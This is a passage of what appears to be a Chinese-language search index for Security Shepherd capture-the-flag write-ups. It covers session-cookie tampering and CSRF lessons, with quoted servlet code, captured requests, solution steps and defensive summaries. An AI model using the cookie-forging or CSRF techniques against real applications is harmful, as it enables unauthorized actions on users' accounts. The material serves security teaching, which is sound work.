Management(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406)"},{"location":"vul/Broken-Authentication-and-Session-Management.html#_1","text":"\u672c\u9898\u4e3b\u8981\u8003\u5bdf\u4e0d\u597d\u7684\u4f1a\u8bdd\u7ba1\u7406,\u9700\u8981\u901a\u8fc7\u70b9\u51fb**\u5b8c\u6210\u8be5\u8bfe\u7a0b**\u6309\u94ae,\u6b3a\u9a97\u670d\u52a1\u5668\uff0c\u8ba9\u670d\u52a1\u5668\u8ba4\u4e3a\u6211\u4eec\u5df2\u7ecf\u5b8c\u6210\u4e86\u8be5\u8bfe\u7a0b\uff0c\u8fdb\u800c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Broken-Authentication-and-Session-Management.html#_2","text":"\u9875\u9762\u70b9\u51fb \u5b8c\u6210\u8be5\u8bfe\u7a0b \u6309\u94ae POST /lessons/b8c19efd1a7cc64301f239f9b9a7a32410a0808138bbefc98986030f9ea83806 HTTP/1.1 Cookie: lessonComplete=lessonNotComplete; JSESSIONID=0B5E5DB01DD31D29205ED99B77ABB56C; token=-127827516577406622538923948450307535312 \u670d\u52a1\u7aef\u4ee3\u7801: /src/main/java/servlets/module/lesson/SessionManagementLesson.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"lessonComplete\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); if(theCookie.getValue().equals(\"lessonComplete\")) { log.debug(\"Lesson Complete\"); \u529f\u80fd\u5b9e\u73b0\uff0c\u8bfb\u53d6cookie,\u5224\u65ad\u662f\u5426\u5b58\u5728cookie\u7684key\u4e3a lessonComplete\uff0c\u8fdb\u800c\u5224\u65adlessonComplete \u7684\u503c \u662f\u5426\u4e3a lessonComplete","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Broken-Authentication-and-Session-Management.html#_3","text":"\u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539cookie\u4e2d\u7684 lessonComplete=lessonNotComplete \u4e3a lessonComplete=lessonComplete \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Broken-Authentication-and-Session-Management.html#_4","text":"\u4e00\u5207\u5ba2\u6237\u7aef\u4f20\u9012\u8fc7\u6765\u7684\u6570\u636e\u90fd\u53ef\u4ee5\u88ab\u7be1\u6539\uff0c\u6240\u4ee5\u90fd\u662f\u4e0d\u53ef\u4fe1\u4efb\u7684\uff0c\u6d89\u53ca\u6838\u5fc3\u9a8c\u8bc1\uff0c\u654f\u611f\u64cd\u4f5c\uff0c\u72b6\u6001\u4fe1\u606f\u4e00\u5b9a\u8981\u4fdd\u5b58\u5230\u670d\u52a1\u7aef\u5982session\u4e2d\uff0c\u7981\u6b62\u5ba2\u6237\u7aef\u4fee\u6539","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html","text":"Cross Site Request Forgery Challenge One(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF) 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u662f\u4e00\u4e2aCSRF\u76f8\u5173\u7684\u9898\uff0c\u9700\u8981\u53e6\u4e00\u4e2a\u7528\u6237\u914d\u5408\u624d\u80fd\u5b8c\u6210 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u63d0\u4ea4\u6d88\u606f \u83b7\u5f97\u8bf7\u6c42 POST /challenges/s74a796e84e25b854906d88f622170c1c06817e72b526b3d1e9a6085f429cf52 HTTP/1.1 myMessage=http%3A%2F%2Fshepherd-cn.anquanbiji.com%2Fuser%2Fcsrfchallengeone%2Fplusplus%3Fuserid%3Df6a93701ead755aa4fd140215b9ca449ce7f3476&csrfToken=75755217751292205141503195192721769803 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728 src/main/java/servlets/module/challenge/CsrfChallengeOne.java \u4e2d String myMessage = request.getParameter(\"myMessage\"); log.debug(\"User Submitted - \" + myMessage); myMessage = Validate.makeValidUrl(myMessage); //\u9a8c\u8bc1\u63d0\u4ea4\u7684\u6d88\u606f\u5982\u679c\u4e0d\u4ee5http\u5f00\u5934\u5219\u589e\u52a0http log.debug(\"Updating User's Stored Message\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); String moduleId = Getter.getModuleIdFromHash(ApplicationRoot, levelHash); String userId = (String)ses.getAttribute(\"userStamp\"); Setter.setStoredMessage(ApplicationRoot, myMessage, userId, moduleId); // \u5b58\u50a8\u7528\u6237\u63d0\u4ea4\u7684\u6d88\u606f \u5230\u6570\u636e\u5e93core\u7684results\u8868\u4e2d URL\u5b57\u6bb5\u662f resultSubmission log.debug(\"Retrieving user's class's forum\"); String classId = null; if(ses.getAttribute(\"userClass\") != null) //\u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u6709userClass session classId = (String)ses.getAttribute(\"userClass\"); String htmlOutput = Getter.getCsrfForumWithImg(ApplicationRoot, classId, moduleId, csrfGenerics); //\u6ca1\u6709userClass \u5219\u65e0\u6cd5\u7ee7\u7eed\u8fdb\u884c log.debug(\"Outputting HTML\"); out.write(htmlOutput); Getter.getCsrfForumWithImg \u5b9e\u73b0\u5982\u4e0b public static String getCsrfForumWithImg (String ApplicationRoot, String classId, String moduleId, ResourceBundle bundle) { log.debug(\"*** Getter.getCsrfForum ***\"); log.debug(\"Getting stored messages from class: \" + classId); String htmlOutput = new String(); Connection conn = Database.getCoreConnection(ApplicationRoot); try { if(classId != null) { //\u6839\u636eclassid\u548cmoduleid \u67e5\u8be2\u7528\u6237\u63d0\u4ea4\u7684\u6d88\u606f \u6700\u7ec8SQL SELECT userName, resultSubmission FROM results JOIN users USING (userId) JOIN class USING (classId) WHERE classId = theClassId AND moduleId = theModuleId; \u76f8\u5f53\u4e8e\u4e00\u4e2a\u7559\u8a00\u677f\u529f\u80fd CallableStatement callstmt = conn.prepareCall(\"call resultMessageByClass(?, ?)\"); log.debug(\"Gathering resultMessageByClass ResultSet\"); callstmt.setString(1, classId); callstmt.setString(2, moduleId); ResultSet resultSet = callstmt.executeQuery(); log.debug(\"resultMessageByClass executed\"); //Table Header htmlOutput = \"<table><tr><th>\" + bundle.getString(\"forum.userName\") + \"</th><th>\" + bundle.getString(\"forum.image\") + \"</th></tr>\"; log.debug(\"Opening Result Set from resultMessageByClass\"); int counter = 0; while(resultSet.next()) { counter++; //\u7528\u6237\u63d0\u4ea4\u7684URL\u5730\u5740\uff0c\u4f1a\u4f5c\u4e3asrc\u5730\u5740\uff0c\u8fdb\u884c\u81ea\u52a8\u8bf7\u6c42\uff0c\u8fbe\u5230\u4e00\u4e2acsrf\u6548\u679c htmlOutput += \"<tr><td>\" + Encode.forHtml(resultSet.getString(1)) + \"</td><td><img src=\\\"\" + Encode.forHtmlAttribute(resultSet.getString(2)) + \"\\\"/></td></tr>\"; } if(counter > 0) log.debug(\"Added a \" + counter + \" row table\"); else log.debug(\"No results from query\"); //Table end htmlOutput += \"</table>\"; } else { log.error(\"User with Null Class detected\"); //\u6ca1\u6709classId \u5219\u53ea\u4f1a\u62a5\u9519 htmlOutput = \"<p><font color='red'>\" + bundle.getString(\"error.noClass\") + \"</font></p>\"; } } catch (SQLException e) { log.error(\"Could not execute query: \" + e.toString()); htmlOutput = \"<p>\" + bundle.getString(\"error.occurred\") + \"</p>\"; } catch (Exception e) { log.fatal(\"Could not return CSRF Forum: \" + e.toString()); } Database.closeConnection(conn); log.debug(\"*** END getCsrfForum ***\"); return htmlOutput; } img src\u4e3a\u7528\u6237\u63d0\u4ea4\u7684\u5730\u5740 /user/csrfchallengeone/plusplus?userid=exampleId\uff0c\u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728 src/main/java/servlets/module/challenge/CsrfChallengeTargetOne.java \u6587\u4ef6\u4e2d ShepherdLogManager.setRequestIp(request.getRemoteAddr(), request.getHeader(\"X-Forwarded-For\"), ses.getAttribute(\"userName\").toString()); log.debug(levelName + \" servlet accessed by: \" + ses.getAttribute(\"userName\").toString()); String plusId = request.getParameter(\"userid\"); log.debug(\"User Submitted - \" + plusId); String userId = (String)ses.getAttribute(\"userStamp\"); if(!userId.equals(plusId)) //\u53ea\u8981session\u4e2d\u7684\u7528\u6237id\u548c\u4f20\u5165\u7684\u7528\u6237id\u53c2\u6570\u4e0d\u540c\uff0c\u5219\u53ef\u4ee5\u589e\u52a0\u522b\u4ebacsrf \u8ba1\u6570 { String ApplicationRoot = getServletContext().getRealPath(\"\"); String userName = (String)ses.getAttribute(\"userName\"); String attackerName = Getter.getUserName(ApplicationRoot, plusId); if(attackerName != null) { log.debug(userName + \" is been CSRF'd by \" + attackerName); log.debug(\"Attempting to Increment \"); String moduleHash = CsrfChallengeOne.getLevelHash(); String moduleId = Getter.getModuleIdFromHash(ApplicationRoot, moduleHash); result = Setter.updateCsrfCounter(ApplicationRoot, moduleId, plusId); } else { log.error(\"UserId '\" + plusId + \"' could not be found.\"); } } \u6240\u4ee5\u8fd9\u9898\u7684classid\u662f\u975e\u5e38\u5173\u952e\u7684\uff0c\u53ea\u6709\u7528\u6237\u5b58\u5728classid\u624d\u4f1a\u88ab\u653b\u51fb\uff0csession\u4e2d\u7684userClass\u662f\u5728\u7528\u6237\u767b\u5f55\u65f6\u8fdb\u884c\u8bbe\u7f6e\u7684 \u5728\u6587\u4ef6 src/main/java/servlets/Login.java \u4e2d String user[] = Getter.authUser(ApplicationRoot, p_login, p_pwd); if(user != null && !user[0].isEmpty()) { //Kill Session and Create a new one with user logged in log.debug(\"Creating new session for \" + user[2] + \" \" + user[1]); ses.invalidate(); ses = request.getSession(true); ses.setAttribute(\"userStamp\", user[0]); ses.setAttribute(\"userName\", user[1]); ses.setAttribute(\"userRole\", user[2]); ses.setAttribute(\"lang\", language); log.debug(\"userClassId = \" + user[4]); ses.setAttribute(\"userClass\", user[4]); //\u8bbe\u7f6e\u7684userClass log.debug(\"Setting CSRF cookie\"); Cookie token = new Cookie(\"token\", Hash.randomString()); if(request.getRequestURL().toString().startsWith(\"https\"))//If Requested over HTTPs token.setSecure(true); response.addCookie(token); mustRedirect = true; #Getter.authUser if(userFound) { //Authenticate User callstmt = conn.prepareCall(\"call authUser(?, ?)\"); log.debug(\"Gathering authUser ResultSet\"); callstmt.setString(1, userName); callstmt.setString(2, password); ResultSet loginAttempt = callstmt.executeQuery(); log.debug(\"Opening Result Set from authUser\"); try { loginAttempt.next(); goOn = true; //Valid password for user submitted } catch (SQLException e) { //... Outer Catch has preference to this one for some reason... This code is never reached! // But I'll leave it here just in case. That includes the else block if goOn is false log.debug(\"Incorrect Credentials\"); goOn = false; } if(goOn) { //ResultSet Not Empty => Credentials Correct result = new String[5]; result[0] = loginAttempt.getString(1); //Id result[1] = loginAttempt.getString(2); //userName result[2] = loginAttempt.getString(3); //role result[4] = loginAttempt.getString(6); //classId \u8bbe\u7f6e\u7684classid \u6765\u81eacore.users\u8868\u4e2d \u7531\u4e8eadmin\u7ba1\u7406\u5458\u662f\u5185\u7f6e\u8d26\u53f7\uff0c\u56e0\u6b64\u5728\u6570\u636e\u5e93core\u8868users\u4e2dadmin\u8d26\u53f7\u6ca1\u6709classid \uff0cadmin\u7528\u6237\u5728\u754c\u9762\u4e0a\u770b\u4e0d\u5230\u522b\u4eba\u53d1\u7684\u6d88\u606f\uff0c\u8fdb\u800c\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4ebacsrf\uff0c\u540c\u65f6\u522b\u4eba\u4e5f\u65e0\u6cd5\u770b\u5230admin\u53d1\u9001\u7684\u6d88\u606f\uff0c\u56e0\u6b64admin\u7528\u6237\u57fa\u672c\u4e0a\u65e0\u6cd5\u5b8c\u6210\u8fd9\u4e2a\u9898\uff0c\u4f46\u662f\u53ef\u4ee5\u628aadmin\u751f\u6210\u7684url\uff0c\u53d1\u9001\u7ed9\u5176\u4ed6\u7528\u6237\u70b9\u51fb\uff0c\u5b9e\u73b0csrf\u7684\u6548\u679c \u89e3\u9898\u6b65\u9aa4 \u00b6 \u6309\u8981\u6c42\uff0c\u63d0\u4ea4\u4e00\u4e2a\u5b8c\u6574url\u5730\u5740\uff0c\u7b49\u5f85\u522b\u7684\u7528\u6237\u67e5\u770b\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u89e6\u53d1csrf\uff0c\u7136\u540e\u653b\u51fb\u8005\u8fd9\u8fb9\u5373\u53ef\u770b\u5230\u901a\u5173\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u9898\u76ee\u672c\u8eab\u6709\u70b9\u7ed5\uff0c\u6838\u5fc3\u662f\u4e00\u4e2acsrf\u653b\u51fb\uff0c\u9700\u8981\u6821\u9a8c\u8bf7\u6c42\u7684referer\uff0c\u589e\u52a0token \u672c\u4f8b\u4e2d\u6821\u9a8creferer\u6ca1\u6709\u6548\u679c\uff0c\u589e\u52a0\u968f\u673atoken\u53ef\u4ee5\uff0c\u540c\u65f6\u7279\u522b\u6838\u5fc3\u529f\u80fd\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528GET\u65b9\u6cd5\u8fdb\u884c\u8bf7\u6c42","title":"Cross Site Request Forgery Challenge One(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF) 1)"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html#cross-site-request-forgery-challenge-one-csrf-1","text":"","title":"Cross Site Request Forgery Challenge One(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF) 1)"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html#_1","text":"\u662f\u4e00\u4e2aCSRF\u76f8\u5173\u7684\u9898\uff0c\u9700\u8981\u53e6\u4e00\u4e2a\u7528\u6237\u914d\u5408\u624d\u80fd\u5b8c\u6210","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html#_2","text":"\u70b9\u51fb\u63d0\u4ea4\u6d88\u606f \u83b7\u5f97\u8bf7\u6c42 POST /challenges/s74a796e84e25b854906d88f622170c1c06817e72b526b3d1e9a6085f429cf52 HTTP/1.1 myMessage=http%3A%2F%2Fshepherd-cn.anquanbiji.com%2Fuser%2Fcsrfchallengeone%2Fplusplus%3Fuserid%3Df6a93701ead755aa4fd140215b9ca449ce7f3476&csrfToken=75755217751292205141503195192721769803 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728 src/main/java/servlets/module/challenge/CsrfChallengeOne.java \u4e2d String myMessage = request.getParameter(\"myMessage\"); log.debug(\"User Submitted - \" + myMessage); myMessage = Validate.makeValidUrl(myMessage); //\u9a8c\u8bc1\u63d0\u4ea4\u7684\u6d88\u606f\u5982\u679c\u4e0d\u4ee5http\u5f00\u5934\u5219\u589e\u52a0http log.debug(\"Updating User's Stored Message\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); String moduleId = Getter.getModuleIdFromHash(ApplicationRoot, levelHash); String userId = (String)ses.getAttribute(\"userStamp\"); Setter.setStoredMessage(ApplicationRoot, myMessage, userId, moduleId); // \u5b58\u50a8\u7528\u6237\u63d0\u4ea4\u7684\u6d88\u606f \u5230\u6570\u636e\u5e93core\u7684results\u8868\u4e2d URL\u5b57\u6bb5\u662f resultSubmission log.debug(\"Retrieving user's class's forum\"); String classId = null; if(ses.getAttribute(\"userClass\") != null) //\u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u6709userClass session classId = (String)ses.getAttribute(\"userClass\"); String htmlOutput = Getter.getCsrfForumWithImg(ApplicationRoot, classId, moduleId, csrfGenerics); //\u6ca1\u6709userClass \u5219\u65e0\u6cd5\u7ee7\u7eed\u8fdb\u884c log.debug(\"Outputting HTML\"); out.write(htmlOutput); Getter.getCsrfForumWithImg \u5b9e\u73b0\u5982\u4e0b public static String getCsrfForumWithImg (String ApplicationRoot, String classId, String moduleId, ResourceBundle bundle) { log.debug(\"*** Getter.getCsrfForum ***\"); log.debug(\"Getting stored messages from class: \" + classId); String htmlOutput = new String(); Connection conn = Database.getCoreConnection(ApplicationRoot); try { if(classId != null) { //\u6839\u636eclassid\u548cmoduleid \u67e5\u8be2\u7528\u6237\u63d0\u4ea4\u7684\u6d88\u606f \u6700\u7ec8SQL SELECT userName, resultSubmission FROM results JOIN users USING (userId) JOIN class USING (classId) WHERE classId = theClassId AND moduleId = theModuleId; \u76f8\u5f53\u4e8e\u4e00\u4e2a\u7559\u8a00\u677f\u529f\u80fd CallableStatement callstmt = conn.prepareCall(\"call resultMessageByClass(?, ?)\"); log.debug(\"Gathering resultMessageByClass ResultSet\"); callstmt.setString(1, classId); callstmt.setString(2, moduleId); ResultSet resultSet = callstmt.executeQuery(); log.debug(\"resultMessageByClass executed\"); //Table Header htmlOutput = \"<table><tr><th>\" + bundle.getString(\"forum.userName\") + \"</th><th>\" + bundle.getString(\"forum.image\") + \"</th></tr>\"; log.debug(\"Opening Result Set from resultMessageByClass\"); int counter = 0; while(resultSet.next()) { counter++; //\u7528\u6237\u63d0\u4ea4\u7684URL\u5730\u5740\uff0c\u4f1a\u4f5c\u4e3asrc\u5730\u5740\uff0c\u8fdb\u884c\u81ea\u52a8\u8bf7\u6c42\uff0c\u8fbe\u5230\u4e00\u4e2acsrf\u6548\u679c htmlOutput += \"<tr><td>\" + Encode.forHtml(resultSet.getString(1)) + \"</td><td><img src=\\\"\" + Encode.forHtmlAttribute(resultSet.getString(2)) + \"\\\"/></td></tr>\"; } if(counter > 0) log.debug(\"Added a \" + counter + \" row table\"); else log.debug(\"No results from query\"); //Table end htmlOutput += \"</table>\"; } else { log.error(\"User with Null Class detected\"); //\u6ca1\u6709classId \u5219\u53ea\u4f1a\u62a5\u9519 htmlOutput = \"<p><font color='red'>\" + bundle.getString(\"error.noClass\") + \"</font></p>\"; } } catch (SQLException e) { log.error(\"Could not execute query: \" + e.toString()); htmlOutput = \"<p>\" + bundle.getString(\"error.occurred\") + \"</p>\"; } catch (Exception e) { log.fatal(\"Could not return CSRF Forum: \" + e.toString()); } Database.closeConnection(conn); log.debug(\"*** END getCsrfForum ***\"); return htmlOutput; } img src\u4e3a\u7528\u6237\u63d0\u4ea4\u7684\u5730\u5740 /user/csrfchallengeone/plusplus?userid=exampleId\uff0c\u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728 src/main/java/servlets/module/challenge/CsrfChallengeTargetOne.java \u6587\u4ef6\u4e2d ShepherdLogManager.setRequestIp(request.getRemoteAddr(), request.getHeader(\"X-Forwarded-For\"), ses.getAttribute(\"userName\").toString()); log.debug(levelName + \" servlet accessed by: \" + ses.getAttribute(\"userName\").toString()); String plusId = request.getParameter(\"userid\"); log.debug(\"User Submitted - \" + plusId); String userId = (String)ses.getAttribute(\"userStamp\"); if(!userId.equals(plusId)) //\u53ea\u8981session\u4e2d\u7684\u7528\u6237id\u548c\u4f20\u5165\u7684\u7528\u6237id\u53c2\u6570\u4e0d\u540c\uff0c\u5219\u53ef\u4ee5\u589e\u52a0\u522b\u4ebacsrf \u8ba1\u6570 { String ApplicationRoot = getServletContext().getRealPath(\"\"); String userName = (String)ses.getAttribute(\"userName\"); String attackerName = Getter.getUserName(ApplicationRoot, plusId); if(attackerName != null) { log.debug(userName + \" is been CSRF'd by \" + attackerName); log.debug(\"Attempting to Increment \"); String moduleHash = CsrfChallengeOne.getLevelHash(); String moduleId = Getter.getModuleIdFromHash(ApplicationRoot, moduleHash); result = Setter.updateCsrfCounter(ApplicationRoot, moduleId, plusId); } else { log.error(\"UserId '\" + plusId + \"' could not be found.\"); } } \u6240\u4ee5\u8fd9\u9898\u7684classid\u662f\u975e\u5e38\u5173\u952e\u7684\uff0c\u53ea\u6709\u7528\u6237\u5b58\u5728classid\u624d\u4f1a\u88ab\u653b\u51fb\uff0csession\u4e2d\u7684userClass\u662f\u5728\u7528\u6237\u767b\u5f55\u65f6\u8fdb\u884c\u8bbe\u7f6e\u7684 \u5728\u6587\u4ef6 src/main/java/servlets/Login.java \u4e2d String user[] = Getter.authUser(ApplicationRoot, p_login, p_pwd); if(user != null && !user[0].isEmpty()) { //Kill Session and Create a new one with user logged in log.debug(\"Creating new session for \" + user[2] + \" \" + user[1]); ses.invalidate(); ses = request.getSession(true); ses.setAttribute(\"userStamp\", user[0]); ses.setAttribute(\"userName\", user[1]); ses.setAttribute(\"userRole\", user[2]); ses.setAttribute(\"lang\", language); log.debug(\"userClassId = \" + user[4]); ses.setAttribute(\"userClass\", user[4]); //\u8bbe\u7f6e\u7684userClass log.debug(\"Setting CSRF cookie\"); Cookie token = new Cookie(\"token\", Hash.randomString()); if(request.getRequestURL().toString().startsWith(\"https\"))//If Requested over HTTPs token.setSecure(true); response.addCookie(token); mustRedirect = true; #Getter.authUser if(userFound) { //Authenticate User callstmt = conn.prepareCall(\"call authUser(?, ?)\"); log.debug(\"Gathering authUser ResultSet\"); callstmt.setString(1, userName); callstmt.setString(2, password); ResultSet loginAttempt = callstmt.executeQuery(); log.debug(\"Opening Result Set from authUser\"); try { loginAttempt.next(); goOn = true; //Valid password for user submitted } catch (SQLException e) { //... Outer Catch has preference to this one for some reason... This code is never reached! // But I'll leave it here just in case. That includes the else block if goOn is false log.debug(\"Incorrect Credentials\"); goOn = false; } if(goOn) { //ResultSet Not Empty => Credentials Correct result = new String[5]; result[0] = loginAttempt.getString(1); //Id result[1] = loginAttempt.getString(2); //userName result[2] = loginAttempt.getString(3); //role result[4] = loginAttempt.getString(6); //classId \u8bbe\u7f6e\u7684classid \u6765\u81eacore.users\u8868\u4e2d \u7531\u4e8eadmin\u7ba1\u7406\u5458\u662f\u5185\u7f6e\u8d26\u53f7\uff0c\u56e0\u6b64\u5728\u6570\u636e\u5e93core\u8868users\u4e2dadmin\u8d26\u53f7\u6ca1\u6709classid \uff0cadmin\u7528\u6237\u5728\u754c\u9762\u4e0a\u770b\u4e0d\u5230\u522b\u4eba\u53d1\u7684\u6d88\u606f\uff0c\u8fdb\u800c\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4ebacsrf\uff0c\u540c\u65f6\u522b\u4eba\u4e5f\u65e0\u6cd5\u770b\u5230admin\u53d1\u9001\u7684\u6d88\u606f\uff0c\u56e0\u6b64admin\u7528\u6237\u57fa\u672c\u4e0a\u65e0\u6cd5\u5b8c\u6210\u8fd9\u4e2a\u9898\uff0c\u4f46\u662f\u53ef\u4ee5\u628aadmin\u751f\u6210\u7684url\uff0c\u53d1\u9001\u7ed9\u5176\u4ed6\u7528\u6237\u70b9\u51fb\uff0c\u5b9e\u73b0csrf\u7684\u6548\u679c","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html#_3","text":"\u6309\u8981\u6c42\uff0c\u63d0\u4ea4\u4e00\u4e2a\u5b8c\u6574url\u5730\u5740\uff0c\u7b49\u5f85\u522b\u7684\u7528\u6237\u67e5\u770b\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u89e6\u53d1csrf\uff0c\u7136\u540e\u653b\u51fb\u8005\u8fd9\u8fb9\u5373\u53ef\u770b\u5230\u901a\u5173\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Request-Forgery-Challenge-One.html#_4","text":"\u9898\u76ee\u672c\u8eab\u6709\u70b9\u7ed5\uff0c\u6838\u5fc3\u662f\u4e00\u4e2acsrf\u653b\u51fb\uff0c\u9700\u8981\u6821\u9a8c\u8bf7\u6c42\u7684referer\uff0c\u589e\u52a0token \u672c\u4f8b\u4e2d\u6821\u9a8creferer\u6ca1\u6709\u6548\u679c\uff0c\u589e\u52a0\u968f\u673atoken\u53ef\u4ee5\uff0c\u540c\u65f6\u7279\u522b\u6838\u5fc3\u529f\u80fd\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528GET\u65b9\u6cd5\u8fdb\u884c\u8bf7\u6c42","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Request-Forgery.html","text":"Cross-Site Request Forgery(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5229\u7528\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u8ba9\u7ba1\u7406\u5458\u8bbf\u95ee\u4e00\u4e2aURL\u5730\u5740 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762\u63d0\u4ea4\u6570\u636e POST /lessons/ed4182af119d97728b2afca6da7cdbe270a9e9dd714065f0f775cd40dc296bc7 HTTP/1.1 messageForAdmin=https%3A%2F%2Fip%2Froot%2FgrantComplete%2FcsrfLesson%3FuserId%3D598717876&csrfToken=66329888183457720076675536392112351575 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 /src/main/java/servlets/module/lesson/CsrfLesson.java String falseId = (String) ses.getAttribute(\"falseId\"); log.debug(\"falseId = \" + falseId); String messageForAdmin = request.getParameter(\"messageForAdmin\").toLowerCase(); log.debug(\"User Submitted - \" + messageForAdmin); String htmlOutput = new String(); boolean validLessonAttack = FindXSS.findCsrfAttackUrl(messageForAdmin, \"/root/grantComplete/csrflesson\", \"userId\", falseId); //\u6838\u5fc3\u9a8c\u8bc1\u64cd\u4f5c if(validLessonAttack) // FindXSS.findCsrfAttackUrl public static boolean findCsrfAttackUrl (String theUrl, String csrfAttackPath, String userIdParameterName, String userIdParameterValue ) { boolean validAttack = false; try { URL theAttack = new URL(theUrl); log.debug(\"csrfAttackPath: \" + csrfAttackPath); log.debug(\"theAttack Host: \" + theAttack.getHost()); log.debug(\"theAttack Port: \" + theAttack.getPort()); log.debug(\"theAttack Path: \" + theAttack.getPath()); log.debug(\"theAttack Query: \" + theAttack.getQuery()); boolean validPath = theAttack.getPath().toLowerCase().endsWith(csrfAttackPath.toLowerCase()); // \u5224\u65ad\u63d0\u4ea4\u7684URL\u662f\u5426\u6b63\u786e if(!validPath) log.debug(\"Invalid Solution: Bad Path submitted. Expected:\" + csrfAttackPath.toLowerCase()); else { boolean validQuery = theAttack.getQuery().toLowerCase().equalsIgnoreCase((userIdParameterName + \"=\" + userIdParameterValue).toLowerCase()); // \u5224\u65ad\u53c2\u6570\u662f\u5426\u6b63\u786e if(!validQuery) log.debug(\"Invalid Solution: Bad Query. Expected: \" + (userIdParameterName + \"=\" + userIdParameterValue).toLowerCase()); else { validAttack = true; } } } catch(MalformedURLException e) { log.debug(\"Invalid URL Submitted: \" + e.toString()); validAttack = false; } catch(Exception e) { log.error(\"FindCSRF Failed: \" + e.toString()); validAttack = false; } return validAttack; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8fd9\u4e2a\u53ea\u662f\u4e00\u4e2a\u6a21\u62dfcsrf\u64cd\u4f5c\uff0c\u56e0\u6b64\u76f4\u63a5\u8f93\u5165\u9898\u76ee\u8981\u6c42\u7684 url\u5730\u5740\u5373\u53ef \u603b\u7ed3 \u00b6 CSRF\u662f\u4e00\u7c7b\u6bd4\u8f83\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u6838\u5fc3\u70b9\u662f\u501f\u7528\u53d7\u5bb3\u8005\u7684cookie,\u8fbe\u5230\u7ed5\u8fc7\u7cfb\u7edf\u6743\u9650\u6821\u9a8c \u5177\u4f53\u5371\u5bb3\u53d6\u51b3\u6f0f\u6d1e\u9875\u9762\u5b9e\u73b0\u7684\u529f\u80fd\uff0c\u5982\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801\u529f\u80fd \u5e38\u89c1\u7684\u89e3\u51b3\u65b9\u6848: - \u6821\u9a8c\u8bf7\u6c42\u7684refer \u662f\u5426\u662f\u672c\u57df - \u6bcf\u4e2a\u8bf7\u6c42\u6dfb\u52a0\u968f\u673atoken","title":"Cross-Site Request Forgery(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020)"},{"location":"vul/Cross-Site-Request-Forgery.html#cross-site-request-forgery","text":"","title":"Cross-Site Request Forgery(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020)"},{"location":"vul/Cross-Site-Request-Forgery.html#_1","text":"\u9700\u8981\u5229\u7528\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u8ba9\u7ba1\u7406\u5458\u8bbf\u95ee\u4e00\u4e2aURL\u5730\u5740","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Request-Forgery.html#_2","text":"\u70b9\u51fb\u9875\u9762\u63d0\u4ea4\u6570\u636e POST /lessons/ed4182af119d97728b2afca6da7cdbe270a9e9dd714065f0f775cd40dc296bc7 HTTP/1.1 messageForAdmin=https%3A%2F%2Fip%2Froot%2FgrantComplete%2FcsrfLesson%3FuserId%3D598717876&csrfToken=66329888183457720076675536392112351575 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 /src/main/java/servlets/module/lesson/CsrfLesson.java String falseId = (String) ses.getAttribute(\"falseId\"); log.debug(\"falseId = \" + falseId); String messageForAdmin = request.getParameter(\"messageForAdmin\").toLowerCase(); log.debug(\"User Submitted - \" + messageForAdmin); String htmlOutput = new String(); boolean validLessonAttack = FindXSS.findCsrfAttackUrl(messageForAdmin, \"/root/grantComplete/csrflesson\", \"userId\", 